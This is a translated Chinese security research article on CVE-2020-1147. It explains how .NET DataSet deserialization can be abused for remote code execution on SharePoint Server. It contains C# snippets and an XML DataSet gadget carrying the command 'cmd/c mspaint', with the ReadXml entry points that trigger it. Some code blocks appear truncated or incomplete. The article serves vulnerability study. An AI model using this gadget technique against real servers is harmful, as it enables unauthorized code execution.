# SharePoint and Pwn: Remote Code Execution Against SharePoint Server
## Abusing DataSet

### 译文声明
本文为翻译文章，仅供参考。具体内容及含义以原文为准。
作者：360核心安全团队

## 摘要
上周，[CVE-2020-1147](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1147) 漏洞发布后，我对其表现形式以及攻击者如何利用该漏洞实现远程代码执行感到好奇。由于我对SharePoint服务器和.NET框架有一定了解，决定深入研究一下。

**简而言之**：
- 我将分享CVE-2020-1147的分析，该漏洞由Oleksandr Mirosh、Markus Wulftange和Jonathan Birch独立发现。
- 我将详细介绍如何利用此漏洞在SharePoint服务器实例上以低权限用户身份实现远程代码执行。
- 请注意，本文不会提供完整的漏洞利用代码。

其中一个值得注意的地方是，微软发布了与此漏洞相关的[安全指南](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/dataset-datatable-dataview/security-guidance)，其中提到：
> 如果传入的XML数据包含不在列表中的对象类型……将抛出异常，反序列化操作失败。当将XML加载到现有的DataSet或DataTable实例时，现有的列定义也会被考虑在内。如果表中已包含自定义类型的列定义，则该类型会在XML反序列化操作期间临时添加到允许列表中。

有趣的是，可以指定类型并覆盖列定义。这是关键点之一，让我们来看看`DataSet`对象是如何创建的。

## 分析
### 理解DataSet对象
`DataSet`包含一个`DataTable`，其中包含`DataColumn`和`DataRow`。更重要的是，它实现了`ISerializable`接口，意味着它可以使用`XmlSerializer`进行序列化。我们首先创建一个`DataTable`：

```csharp
static void Main(string[] args)
{
    // 创建表格
    DataTable exptable = new DataTable("exp table");
    // 创建列并设置类型信息，并将其添加到表格中
    DataColumn dc = new DataColumn("ObjectDataProviderCol");
    dc.DataType = typeof(ObjectDataProvider);
    exptable.Columns.Add(dc);
    // 创建行并设置对象实例，并将其添加到表格中
    DataRow row = exptable.NewRow();
    row["ObjectDataProviderCol"] = new ObjectDataProvider();
    exptable.Rows.Add(row);
    // 导出XML模式
    exptable.WriteXmlSchema("c:/poc-schema.xml");
}
```

使用`WriteXmlSchema`方法，可以写出模式定义。上述代码生成以下内容：

```xml
" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
```

查看`DataSet`的源代码，可以看到它暴露了自己的序列化方法（基于`XmlSerializer`），使用`WriteXml`和`ReadXml`：

```csharp
System.Data.DataSet.ReadXml(XmlReader reader, Boolean denyResolving)
  System.Data.DataSet.ReadXmlDiffgram(XmlReader reader)
    System.Data.XmlDataLoader.LoadData(XmlReader reader)
      System.Data.XmlDataLoader.LoadTable(DataTable table, Boolean isNested)
        System.Data.XmlDataLoader.LoadColumn(DataColumn column, Object[] foundColumns)
          System.Data.DataColumn.ConvertXmlToObject(XmlReader xmlReader, XmlRootAttribute xmlAttrib)
            System.Data.Common.ObjectStorage.ConvertXmlToObject(XmlReader xmlReader, XmlRootAttribute xmlAttrib)
System.Xml.Serialization.XmlSerializer.Deserialize(XmlReader xmlReader)
```

现在，只需将表格添加到数据集中并进行序列化：

```csharp
DataSet ds = new DataSet("poc");
ds.Tables.Add(exptable);
using (var writer = new StringWriter())
{
    ds.WriteXml(writer);
    Console.WriteLine(writer.ToString());
}
```

这些序列化方法保留了模式类型，并在运行时使用单个`DataSet`预期类型在实例化的`XmlSerializer`对象图中重建受攻击者影响的类型。

### DataSet小工具
下面是一个示例小工具，注意不要与`ysoserial`中的DataSet小工具混淆：

```xml
<xs:schema id="NewDataSet" xmlns="" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" id="somedataset">
  <xs:element name="NewDataSet" msdata:IsDataSet="true" msdata:UseCurrentLocale="true">
    <xs:complexType>
      <xs:choice minOccurs="0" maxOccurs="unbounded">
        <xs:element name="ObjectDataProviderCol" type="xs:string" />
      </xs:choice>
    </xs:complexType>
  </xs:element>
</xs:schema>
<diffgr:diffgram xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" xmlns:diffgr="urn:schemas-microsoft-com:xml-diffgram-v1">
  <DocumentElement xmlns="">
    <ObjectDataProviderCol diffgr:id="ObjectDataProviderCol1" msdata:rowOrder="0" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">cmd/c mspaint</ObjectDataProviderCol>
  </DocumentElement>
</diffgr:diffgram>
```

这个小工具链将调用`Type`上的任意静态方法，这里使用了著名的`XamlReader.Parse`来加载恶意XAML以执行系统命令。我使用了`ExpandedWrapper`类来加载两种不同的类型，正如[@pwntester](https://twitter.com/pwntester)在其[出色的研究](https://speakerdeck.com/pwntester/attacking-net-serialization)中所提到的。

这种小工具可以在多种场景中利用，例如：

```csharp
XmlSerializer ser = new XmlSerializer(typeof(DataSet));
Stream reader = new FileStream("c:/poc.xml", FileMode.Open);
ser.Deserialize(reader);
```

许多应用程序认为`DataSet`是安全的，即使无法直接控制预期类型到`XmlSerializer`，`DataSet`通常也用于对象图中。然而，最有趣的入口点是`DataSet.ReadXml`以触发代码执行：

```csharp
DataSet ds = new DataSet();
ds.ReadXml("c:/poc.xml");
```

### 将小工具应用于SharePoint服务器
如果我们查看[ZDI-20-874](https://www.zerodayinitiative.com/advisories/ZDI-20-874/)，公告中提到了`Microsoft.PerformancePoint.Scorecards.Client.ExcelDataSet`控件，该控件可用于远程代码执行。这立即引起了我的兴趣，因为其类名中包含“DataSet”。让我们看看SharePoint的默认web.config文件：

```xml
<!-- 默认web.config文件内容 -->
```

通过这种方式，攻击者可以利用`DataSet`对象在SharePoint服务器上实现远程代码执行。